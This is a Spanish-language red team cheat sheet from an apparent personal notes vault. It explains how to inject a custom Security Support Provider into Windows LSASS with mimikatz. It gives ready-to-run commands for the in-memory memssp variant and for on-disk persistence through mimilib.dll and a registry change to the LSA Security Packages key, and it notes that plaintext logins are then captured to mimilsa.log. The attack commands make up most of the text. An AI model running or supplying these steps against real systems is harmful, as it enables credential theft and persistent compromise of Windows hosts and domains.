---
aliases:
  - Custom SSP Injection
tags:
  - technique/persistence
  - technique/credential-access
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Custom SSP]]"
---
# Custom SSP - Inyección

> Dos variantes: en **memoria** (`memssp`, volátil, no requiere reboot) o en **disco** (`mimilib.dll` + registro, persiste reinicios). Requiere admin/SYSTEM.

---

## En Memoria (memssp)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `mimikatz # privilege::debug` + `misc::memssp` | Inyecta el SSP en LSASS en runtime → loguea logins | Captura rápida sin tocar disco. |
| (logins posteriores) → `C:\Windows\System32\mimilsa.log` | Credenciales en texto plano | Se pierde al reiniciar el host. |
^cssp-inject-mem

## En Disco (mimilib + registro)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `copy mimilib.dll %SystemRoot%\System32\` | DLL del SSP en disco | Setup de persistencia. |
| `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages"` | SSPs registrados actuales | Leer antes de modificar. |
| `reg add ...\Lsa /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0...\0mimilib\0"` | Registra `mimilib` como SSP (carga al boot) | Persistencia tras reinicio. |
| `Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages"` | Verificar el registro del SSP | Confirmación. |
^cssp-inject-disk

### PoC memssp

```text
mimikatz # privilege::debug
mimikatz # misc::memssp
:: Cada login posterior se escribe en texto plano en C:\Windows\System32\mimilsa.log
```

---

> Leer las credenciales capturadas: [[Custom SSP - Recolección]].
